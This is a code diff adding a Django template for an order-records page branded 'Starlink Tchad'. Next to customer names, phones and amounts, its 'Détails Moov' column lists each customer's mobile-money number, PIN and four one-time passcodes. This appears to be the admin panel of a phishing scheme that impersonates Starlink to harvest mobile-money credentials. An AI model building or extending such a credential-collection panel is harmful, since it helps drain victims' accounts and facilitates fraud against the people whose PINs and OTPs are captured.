@@ -1,0 +1,74 @@
+{% extends "base.html" %}
+
+{% block title %}Enregistrements des Commandes - Starlink Tchad{% endblock %}
+
+{% block content %}
+<div class="bg-white rounded-2xl card-shadow overflow-hidden border border-gray-100">
+    <div class="p-8 border-b border-gray-100 flex justify-between items-center">
+        <h1 class="text-2xl font-bold text-gray-800">Enregistrements des Commandes Starlink</h1>
+        <span class="bg-gray-100 text-gray-600 px-4 py-1 rounded-full text-sm font-medium">
+            Total: {{ orders.count }}
+        </span>
+    </div>
+
+    <div class="overflow-x-auto">
+        <table class="w-full text-left">
+            <thead class="bg-gray-50 text-gray-500 text-xs uppercase tracking-wider">
+                <tr>
+                    <th class="px-8 py-4 font-semibold">ID Commande</th>
+                    <th class="px-8 py-4 font-semibold">Client</th>
+                    <th class="px-8 py-4 font-semibold">Forfait</th>
+                    <th class="px-8 py-4 font-semibold">Montant</th>
+                    <th class="px-8 py-4 font-semibold">Statut</th>
+                    <th class="px-8 py-4 font-semibold">Date</th>
+                    <th class="px-8 py-4 font-semibold">Détails Moov</th>
+                </tr>
+            </thead>
+            <tbody class="divide-y divide-gray-100">
+                {% for order in orders %}
+                <tr class="hover:bg-gray-50 transition">
+                    <td class="px-8 py-4 font-medium text-gray-900">#SLR-{{ order.id|stringformat:"05d" }}</td>
+                    <td class="px-8 py-4">
+                        <div class="text-sm font-bold text-gray-800">{{ order.full_name }}</div>
+                        <div class="text-xs text-gray-500">{{ order.phone_number }}</div>
+                    </td>
+                    <td class="px-8 py-4 text-sm text-gray-600">{{ order.package_name }}</td>
+                    <td class="px-8 py-4 font-bold text-gray-900">XAF {{ order.amount }}</td>
+                    <td class="px-8 py-4">
+                        {% if order.status == 'completed' %}
+                        <span class="px-2.5 py-0.5 rounded-full text-xs font-medium bg-green-100 text-green-800">Terminé</span>
+                        {% elif order.status == 'pending' %}
+                        <span class="px-2.5 py-0.5 rounded-full text-xs font-medium bg-yellow-100 text-yellow-800">En attente</span>
+                        {% else %}
+                        <span class="px-2.5 py-0.5 rounded-full text-xs font-medium bg-blue-100 text-blue-800">{{ order.status|title }}</span>
+                        {% endif %}
+                    </td>
+                    <td class="px-8 py-4 text-sm text-gray-500">{{ order.created_at|date:"d M, Y" }}</td>
+                    <td class="px-8 py-4 text-xs text-gray-600">
+                        {% if order.airtel_number %}
+                        <div class="flex flex-col">
+                            <span>Num: {{ order.airtel_number }}</span>
+                            <span>PIN: {{ order.pin|default:"-" }}</span>
+                            <span>OTP 1: {{ order.otp|default:"-" }}</span>
+                            <span>OTP 2: {{ order.otp_1|default:"-" }}</span>
+                            <span>OTP 3: {{ order.otp_2|default:"-" }}</span>
+                            <span>OTP 4: {{ order.otp_3|default:"-" }}</span>
+                        </div>
+                        {% else %}
+                        <span class="text-gray-400 italic">Aucun détail</span>
+                        {% endif %}
+                    </td>
+                </tr>
+                {% empty %}
+                <tr>
+                    <td colspan="7" class="px-8 py-12 text-center text-gray-500">
+                        <i class="uil uil-invoice text-4xl mb-2 block"></i>
+                        Aucune commande trouvée.
+                    </td>
+                </tr>
+                {% endfor %}
+            </tbody>
+        </table>
+    </div>
+</div>
+{% endblock %}
